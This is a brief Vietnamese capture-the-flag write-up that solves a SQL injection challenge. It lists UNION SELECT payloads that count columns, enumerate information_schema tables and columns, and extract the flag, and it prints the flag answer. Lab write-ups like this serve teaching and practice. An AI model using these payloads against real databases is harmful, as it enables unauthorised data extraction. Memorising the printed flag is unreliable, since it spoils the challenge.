## Solution

Tôi test bằng câu lệnh đơn giản sau để biết nó có lỗ hổng `sql`

![img27](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PortSwigger/SQL-Injection/images/image-27.png?raw=true)

Sử dụng `UNION attack` để tìm ra số cột của truy vấn trả về

```
1 UNION SELECT NULL,NULL,NULL,NULL--
```

![img28](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/PortSwigger/SQL-Injection/images/image-28.png?raw=true)

> Có 4 cột

Tiếp theo trích xuất tên các table

```
1 UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables--
```

![img29]()

> table: `w0w_y0u_f0und_m3`

Trích xuất tên các cột có trong table này

```
1 UNION SELECT column_name , NULL , NULL , NULL FROM information_schema.columns--
```

![img30]()

> column: f0und_m3

Tìm flag:

```
1 UNION SELECT f0und_m3 , NULL , NULL , NULL FROM w0w_y0u_f0und_m3--
```

![img31]()

> Flag: `abctf{uni0n_1s_4_gr34t_c0mm4nd}`
